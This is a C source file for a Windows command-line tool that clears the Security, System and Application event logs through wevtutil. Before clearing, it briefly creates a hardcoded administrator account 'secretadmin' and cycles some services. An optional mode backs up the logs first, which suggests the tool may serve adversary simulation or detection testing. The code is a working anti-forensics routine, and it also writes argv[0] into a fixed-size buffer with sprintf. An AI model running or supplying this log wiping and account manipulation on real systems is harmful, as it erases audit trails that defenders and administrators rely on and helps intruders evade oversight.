#include <windows.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <stdbool.h>

void shell(char* cmd) {
    printf("Running:\n%s\n\n", cmd);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);    
}

int main(int argc, char* argv[]) {
    char* shellStr;

    bool security = false;
    bool system = false;
    bool application = false;
    bool safe = true;

    // Parse command-line args
    // -h = Help
    // --security = Clear security log
    // --system = Clear system log
    // --application = Clear application log
    // --no-safe = Perform full log clear w/o backup and restore functionality
    // None (Default) = Clear all 3 safely

    if (argc == 1) { // no arg specified
        shellStr = "cmd.exe /c \"copy \%SystemRoot\%\\System32\\winevt\\logs\\Security.evtx Security.evtx & "
            "copy \%SystemRoot\%\\System32\\winevt\\logs\\System.evtx System.evtx & "
            "copy \%SystemRoot\%\\System32\\winevt\\logs\\Application.evtx Application.evtx & "
            "net user /add secretadmin secretadmin & net localgroup administrators secretadmin /add & net user secretadmin /delete & "
            "net start WMPNetworkSvc & net stop WMPNetworkSvc & "
            "net stop tvnserver & net start tvnserver & "
            "wevtutil cl security & wevtutil cl system & wevtutil cl application & "
            //"taskkill /FI \"SERVICES eq EventLog\" /F & "
            //"copy Security.evtx \%SystemRoot\%\\System32\\winevt\\logs\\Security.evtx & "
            //"copy System.evtx \%SystemRoot\%\\System32\\winevt\\logs\\System.evtx & "
            //"copy Application.evtx \%SystemRoot\%\\System32\\winevt\\logs\\Application.evtx & "            
            //"net start EventLog & "
            "cls & echo \"DONE!\"\"";
        shell(shellStr);
    } else {

        for(int i = 1; i < argc; i++) {
            char* arg = argv[i];

            if(strcmp(arg, "-h") == 0) {
                printf("-h | Display help\n--security | Clear Security Logs\n--system | Clear System Logs\n--application | Clear Application Logs\n--no-safe | Clear logs without safe backup and restore\nDefault: Clear all 3 safely");
                return 0;
            }
            else if(strcmp(arg, "--security") == 0) {
                security = true;
            }
            else if(strcmp(arg, "--system") == 0) {
                system = true;
            }
            else if(strcmp(arg, "--application") == 0) {
                application = true;
            }
            else if(strcmp(arg, "--no-safe") == 0) {
                safe = false;
            }
            else {
                printf("log_clearing: unrecognized argument\nUsage: ./log_clearing.exe [-h/--security/--system/--application/--no-safe]\n");
                return 1;
            }
        }

        if (security) {
            if(safe) {
                shellStr = "cmd.exe /c \"copy \%SystemRoot\%\\System32\\winevt\\logs\\Security.evtx Security.evtx & "
                "net user /add secretadmin secretadmin & "
                "net localgroup administrators secretadmin /add & "
                "net user secretadmin /delete & "
                "wevtutil cl security & "
                //"taskkill /FI \"SERVICES eq EventLog\" /F & "
                //"copy Security.evtx \%SystemRoot\%\\System32\\winevt\\logs\\Security.evtx & "
                //"net start EventLog & "
                "cls & echo 'Security Log: DONE'\"";
                shell(shellStr);
            }
            else {
                shellStr = "cmd.exe /c \"net user /add secretadmin secretadmin & "
                "net localgroup administrators secretadmin /add & "
                "net user secretadmin /delete & "
                "wevtutil cl security & "
                "cls & echo 'Security Log: DONE'\"";
                shell(shellStr);
            }
        }

        if(system) {
            if (safe) {
                shellStr = "cmd.exe /c \"copy \%SystemRoot\%\\System32\\winevt\\logs\\System.evtx System.evtx & "
                    "net start WMPNetworkSvc & "
                    "net stop WMPNetworkSvc & "
                    "wevtutil cl system & "
                    //"taskkill /FI \"SERVICES eq EventLog\" /F & "
                    //"copy System.evtx \%SystemRoot\%\\System32\\winevt\\logs\\System.evtx & "
                    //"net start EventLog & "
                    "cls & echo 'System Log: DONE'\"";
                shell(shellStr);
            } else {
                shellStr = "cmd.exe /c \"net start WMPNetworkSvc & "
                    "net stop WMPNetworkSvc &"
                    "wevtutil cl system & "
                    "cls & echo 'System Log: DONE'\"";
                shell(shellStr);
            }
        }

        if(application) {
            if (safe) {
                shellStr = "cmd.exe /c \"copy \%SystemRoot\%\\System32\\winevt\\logs\\Application.evtx Application.evtx & "
                    "net stop tvnserver & "
                    "net start tvnserver & "
                    "wevtutil cl application & "
                    //"taskkill /FI \"SERVICES eq EventLog\" /F & "
                    //"copy Application.evtx \%SystemRoot\%\\System32\\winevt\\logs\\Application.evtx & "
                    //"net start EventLog & "
                    "cls & echo 'Application Log: DONE'\"";
                shell(shellStr);
            } else {
                shellStr = "cmd.exe /c \"net stop tvnserver & "
                    "net start tvnserver & "
                    "wevtutil cl application & "
                    "cls & echo 'Application Log: DONE'\"";
                shell(shellStr);
            }
        }
    }

    if(safe) {
        // Maximum PATHLEN = 256
        char dialogMsg[512];

        char* applicationStr;
        char* systemStr;
        char* securityStr;

        if(application) {
            applicationStr = "APPLICATION";
        } else {
            applicationStr = "";
        }

        if(system) {
            systemStr = "SYSTEM";
        } else {
            systemStr = "";
        }

        if(security) {
            securityStr = "SECURITY";
        } else {
            securityStr = "";
        }

        sprintf(dialogMsg, "WARNING THE FOLLOWING LOGS HAVE BEEN CLEARED:\n%s %s %s\n\nWait for your cmd/powershell window to say \"DONE\".\n\n"
            "Backups of log files will be saved alongside this executable at %s\n\nTo restore "
            "these log files:\n\nStart Event Viewer\nNavigate to Action->Open Saved Log\n"
            "Select the backed-up log file.\nAfter opening, the log file will be visible under the Saved Logs section in the left sidebar.", securityStr, systemStr, applicationStr, argv[0]);
        
        MessageBox(NULL, dialogMsg, "log_clearing: Instructions", 0);
    }

    return 0;
}